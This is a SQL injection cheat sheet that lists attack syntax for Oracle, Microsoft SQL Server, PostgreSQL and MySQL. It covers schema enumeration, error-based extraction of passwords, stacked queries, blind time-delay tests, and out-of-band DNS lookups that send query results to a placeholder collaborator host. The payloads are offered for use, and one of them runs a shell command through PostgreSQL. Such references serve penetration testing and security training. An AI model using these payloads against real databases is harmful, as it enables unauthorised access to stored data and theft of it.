# SQL Injection Cheat Sheet

This cheat sheet provides examples of useful syntax for performing SQL injection attacks.

---

## String Concatenation

You can concatenate multiple strings to form a single string.

| Database      | Syntax                       |
|---------------|------------------------------|
| Oracle        | `'foo'||'bar'`              |
| Microsoft     | `'foo'+'bar'`               |
| PostgreSQL    | `'foo'||'bar'`              |
| MySQL         | `'foo' 'bar'` *(with space)*<br>`CONCAT('foo','bar')` |

---

## Substring

Extract part of a string from a specified offset and length (1-based indexing).

| Database      | Syntax                         |
|---------------|--------------------------------|
| Oracle        | `SUBSTR('foobar', 4, 2)`      |
| Microsoft     | `SUBSTRING('foobar', 4, 2)`   |
| PostgreSQL    | `SUBSTRING('foobar', 4, 2)`   |
| MySQL         | `SUBSTRING('foobar', 4, 2)`   |

---

## Comments

Use comments to truncate a query and ignore subsequent content.

| Database      | Syntax                        |
|---------------|-------------------------------|
| Oracle        | `--comment`                  |
| Microsoft     | `--comment`<br>`/*comment*/` |
| PostgreSQL    | `--comment`<br>`/*comment*/` |
| MySQL         | `#comment`<br>`-- comment` *(space required)*<br>`/*comment*/` |

---

## Database Version

Query the database type and version.

| Database      | Syntax                                   |
|---------------|------------------------------------------|
| Oracle        | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
| Microsoft     | `SELECT @@version`                      |
| PostgreSQL    | `SELECT version()`                      |
| MySQL         | `SELECT @@version`                      |

---

## Oracle Metadata Views

Oracle databases use a set of system views to manage and query metadata. Here are the key views for accessing information about tables and columns, along with their important columns:

- **`ALL_TABLES`**: Lists all tables accessible to the user.
  - **Key Columns**:
    - `TABLE_NAME`: Name of the table.
    - `OWNER`: Owner of the table (schema).
    - `TABLESPACE_NAME`: Tablespace where the table is stored.
    - `NUM_ROWS`: Approximate number of rows in the table (if statistics are gathered).
    - `LAST_ANALYZED`: Date when the table was last analyzed.

- **`ALL_TAB_COLUMNS`**: Contains information about the columns of all tables accessible to the user.
  - **Key Columns**:
    - `TABLE_NAME`: Name of the table.
    - `COLUMN_NAME`: Name of the column.
    - `DATA_TYPE`: Data type of the column.
    - `DATA_LENGTH`: Length of the column data type.
    - `NULLABLE`: Indicates if the column allows NULL values.

- **`DBA_TABLES`**: Provides details of all tables in the database (requires DBA privileges).
  - **Key Columns**:
    - Same as `ALL_TABLES`.

- **`USER_TABLES`**: Lists tables owned by the current user.
  - **Key Columns**:
    - Same as `ALL_TABLES`.

- **`USER_TAB_COLUMNS`**: Contains information about columns in tables owned by the current user.
  - **Key Columns**:
    - Same as `ALL_TAB_COLUMNS`.

---

## Database Contents

List tables and their columns.

| Database      | Syntax                                                   |
|---------------|----------------------------------------------------------|
| Oracle        | `SELECT * FROM all_tables`<br>`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft     | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL    | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL         | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

---

## Conditional Errors

Test a condition and trigger an error if true.

| Database      | Syntax                                                    |
|---------------|-----------------------------------------------------------|
| Oracle        | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL    | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL         | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

---

## Extracting Data via Error Messages

Elicit error messages to leak sensitive data.

| Database      | Example                                                |
|---------------|--------------------------------------------------------|
| Microsoft     | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`<br>`> Conversion failed when converting the varchar value 'secret' to data type int.` |
| PostgreSQL    | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`<br>`> invalid input syntax for integer: "secret"` |
| MySQL         | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`<br>`> XPATH syntax error: '\secret'` |

---

## Batched (or Stacked) Queries

Execute multiple queries in succession.

| Database      | Syntax                                                   |
|---------------|----------------------------------------------------------|
| Oracle        | Not supported                                            |
| Microsoft     | `QUERY-1-HERE; QUERY-2-HERE`<br>`QUERY-1-HERE QUERY-2-HERE` |
| PostgreSQL    | `QUERY-1-HERE; QUERY-2-HERE`                             |
| MySQL         | `QUERY-1-HERE; QUERY-2-HERE` *(may depend on APIs)*      |

---

## Time Delays

Cause an unconditional time delay of 10 seconds.

| Database      | Syntax                     |
|---------------|----------------------------|
| Oracle        | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft     | `WAITFOR DELAY '0:0:10'`   |
| PostgreSQL    | `SELECT pg_sleep(10)`      |
| MySQL         | `SELECT SLEEP(10)`         |

---

## Conditional Time Delays

Trigger a time delay if a condition is true.

| Database      | Syntax                                              |
|---------------|-----------------------------------------------------|
| Oracle        | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft     | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`   |
| PostgreSQL    | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL         | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`      |

---

## DNS Lookup

Trigger a DNS lookup to an external domain (e.g., Burp Collaborator).

| Database      | Syntax                                                       |
|---------------|--------------------------------------------------------------|
| Oracle        | `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`<br>Or via XXE (if vulnerable). |
| Microsoft     | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`  |
| PostgreSQL    | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| MySQL         | `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` *(Windows only)* |

---

## DNS Lookup with Data Exfiltration

Exfiltrate query results via DNS lookup.

| Database      | Syntax                                                    |
|---------------|-----------------------------------------------------------|
| Oracle        | `SELECT EXTRACTVALUE(xmltype('<?xml ... SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
| Microsoft     | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')` |
| PostgreSQL    | See full function in original document.                   |
| MySQL         | `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` *(Windows only)* |

---
